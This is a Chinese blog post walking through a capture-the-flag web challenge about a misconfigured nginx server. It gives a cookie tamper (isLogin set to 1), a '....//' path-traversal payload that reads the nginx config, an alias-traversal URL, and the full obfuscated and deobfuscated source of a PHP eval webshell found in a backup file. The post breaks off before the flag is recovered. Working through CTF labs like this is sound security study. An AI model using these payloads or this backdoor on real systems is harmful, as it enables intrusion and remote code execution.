{"blogid": "125612782", "writerAge": "码龄1年", "writerBlogNum": "2", "writerCollect": "1", "writerComment": "0", "writerFan": "0", "writerGrade": "1级", "writerIntegral": "37", "writerName": "大雾四起liert", "writerProfileAdress": "writer_image\\profile_125612782.jpg", "writerRankTotal": "163958", "writerRankWeekly": "1337707", "writerThumb": "0", "writerVisitNum": "7089", "blog_read_count": "988", "blog_time": "于 2022-07-05 12:33:43 发布", "blog_title": "攻防世界-WEB进阶区-Web_php_wrong_nginx_config", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p>1、进入靶场 </p>\n<p><img alt=\"\" height=\"145\" src=\"image\\bbba3ef64deb43b59e71f83a0a29a640.png\" width=\"267\"/></p>\n<p>2、根据题目提示是Nginx配置错误，先看看网站有没有robots.txt文件</p>\n<p><img alt=\"\" height=\"131\" src=\"image\\d97add1eb52a4cb082778000069c1c13.png\" width=\"251\"/></p>\n<p> 3、hint.php给出配置文件路径</p>\n<p><img alt=\"\" height=\"57\" src=\"image\\cc4161cd2b344cada114d13a7bb00882.png\" width=\"609\"/></p>\n<p> 4、Hack.php响应之后回到登录界面，这里用Burp抓包看一下响应内容</p>\n<p><img alt=\"\" height=\"643\" src=\"image\\f18e730bb7064de395dc5d84c137cbae.png\" width=\"1200\"/></p>\n<p> 发现cookie有可疑参数isLogin应该是判断是否登录，把0改成1放走数据包，进入新的页面</p>\n<p><img alt=\"\" height=\"926\" src=\"image\\276ba51639a04289998367f7681d4b9a.png\" width=\"1200\"/></p>\n<p> 5、检测源码发现，管理中心可以前往其他页面</p>\n<p><img alt=\"\" height=\"673\" src=\"image\\0cff42b03e164dd9aa452b1b37248867.png\" width=\"934\"/></p>\n<p> 直接进进不去，需要抓包修改cookie</p>\n<p>6、进来之后来到这个页面</p>\n<p><img alt=\"\" height=\"668\" src=\"image\\4885b86059e84d90b8fdf8b9110c7f33.png\" width=\"1015\"/></p>\n<p> 根据页面的回显，这里可以读取文件（Brup不太容易分辨，可以用HackBar）</p>\n<pre><code>?file=index.php&amp;ext=和?file=index&amp;ext=php内容读取一样</code></pre>\n<p><img alt=\"\" height=\"703\" src=\"image\\e98261062da2447c86c6dfa3ba56d83e.png\" width=\"769\"/>经过测试这个会把<span style=\"background-color:#38d8f0;\">../</span>替换为空，可以构造<span style=\"background-color:#38d8f0;\">....//</span>绕过。使用</p>\n<pre><code>?file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext=</code></pre>\n<p><img alt=\"\" height=\"874\" src=\"image\\2ff36b22aaca4545a1aa9d12baee8d98.png\" width=\"1200\"/></p>\n<p>7、 Nginx配置</p>\n<pre><code>location /web-img {\n    alias /images/;\n    autoindex on;\n}\n这是开发人员想让我们访问/web-img这个目录，但是没有在/web-img后面加/,导致我们可以构造/web-img../\n和alisa拼接起来就成了/images/web-img/../,造成目录穿越漏洞</code></pre>\n<p> 8、访问/web-img./目录</p>\n<p><img alt=\"\" height=\"567\" src=\"image\\fc300ccff5864f059a89e35429b6273e.png\" width=\"784\"/></p>\n<p> 进入网站目录发现有备份文件，下载一下</p>\n<p><img alt=\"\" height=\"178\" src=\"image\\210a6906a1ac4a8ba00d2522ba4d3a85.png\" width=\"797\"/></p>\n<p> 9、代码审计</p>\n<pre><code class=\"language-php\">&lt;?php\n$U='_/|U\",\"/-/|U\"),ar|Uray|U(\"/|U\",\"+\"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle';\n$q='s[|U$i]=\"\";$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui';\n$M='l=\"strtolower|U\";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$';\n$z='r=@$r[|U\"HTTP_R|UEFERER|U\"];$r|U|Ua=@$r[\"HTTP_A|U|UCCEPT_LAN|UGUAGE|U\"];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r';\n$k='?:;q=0.([\\\\|Ud]))?,|U?/\",$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=\"|Usubst|Ur\";|U|U$s';\n$o='|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r';\n$N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(\"/';\n$C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(\"|U&lt;$k&gt;$d&lt;/$k&gt;\"|U);@ses|U|Usion_des|Utroy();}}}}';\n$j='$k|Uh=\"|U|U42f7\";$kf=\"e9ac\";fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\"\";fo|Ur($i=0;$i&lt;';\n$R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion');\n$J='kf|U),|U0,3));$p=\"|U\";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$';\n$x='r)|U;pa|Urse|U_str($u[\"qu|U|Uery\"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(\"/([\\\\|U|Uw])[|U\\\\w-]+|U(';\n$f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);\n$g=create_function('',$f);\n?&gt;</code></pre>\n<blockquote>\n<p> create_function()函数</p>\n<p>根据传递的参数创建匿名函数，并为其返回唯一名称。</p>\n<p>语法：</p>\n<pre>1 create_function(string $args,string $code)\n2 string $args 声明的函数变量部分\n3 string $code 执行的方法代码部分</pre>\n<p>参考：<a class=\"link-info\" href=\"https://www.cnblogs.com/zzjdbk/p/12980483.html\" title=\"PHP代码审计之create_function()函数\">PHP代码审计之create_function()函数</a></p>\n</blockquote>\n<p> 把代码部分输出echo $f；</p>\n<pre><code class=\"language-php\">&lt;?php\n$kh=\"42f7\";\n$kf=\"e9ac\";\nfunction x($t,$k){\n    $c=strlen($k);\n    $l=strlen($t);\n    $o=\"\";\n    for($i=0;$i&lt;$l;){\n        for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++){\n            $o.=$t{$i}^$k{$j};\n        }\n    }\n    return $o;\n}\n$r=$_SERVER;\n$rr=@$r[\"HTTP_REFERER\"]; // 获取来源URL\n$ra=@$r[\"HTTP_ACCEPT_LANGUAGE\"];  // 客户端可以理解的编码\nif($rr&amp;&amp;$ra){\n    $u=parse_url($rr);  //解析URL，返回数组\n    parse_str($u[\"query\"],$q);  //字符串解析成变量\n    $q=array_values($q);  // 获取数组所有的值\n    preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\",$ra,$m);  // 全局正则表达式匹配\n    if($q&amp;&amp;$m){\n        @session_start();  // 开启会话\n        $s=&amp;$_SESSION;  // 储存用户会话信息\n        $ss=\"substr\";  // 切割字符串\n        $sl=\"strtolower\";  // 所有字符转换成小写\n        $i=$m[1][0].$m[1][1];\n        $h=$sl($ss(md5($i.$kh),0,3));  // h=***\n        $f=$sl($ss(md5($i.$kf),0,3));  // f=***\n        $p=\"\";\n        for($z=1;$z&lt;count($m[1]);$z++)\n            $p.=$q[$m[2][$z]];  // p=$h + * + $f\n        if(strpos($p,$h)===0){\n            $s[$i]=\"\";\n            $p=$ss($p,3);\n        }\n        if(array_key_exists($i,$s)){\n            $s[$i].=$p;\n            $e=strpos($s[$i],$f);  // 检查字符串的第一次出现的位置\n            if($e){\n                $k=$kh.$kf;\n                ob_start(); // 打开输出缓冲区\n                @eval(\n                    @gzuncompress(\n                        @x(@base64_decode(\n                              preg_replace(\n                                  array(\"/_/\",\"/-/\"),array(\"/\",\"+\"),$ss($s[$i],0,$e)\n                               )\n                         ),$k)\n                    )\n                );\n                $o=ob_get_contents(); // 返回输出缓冲区的内容\n                ob_end_clean();  // 清空缓冲区并关闭\n                $d=base64_encode(x(gzcompress($o),$k));\n                print(\"&lt;$k&gt;$d&lt;/$k&gt;\");\n                @session_destroy();\n            }\n        }\n    }\n}\n?&gt;</code></pre>\n<p>后面就不会了。。。</p>\n</div>\n</div>"}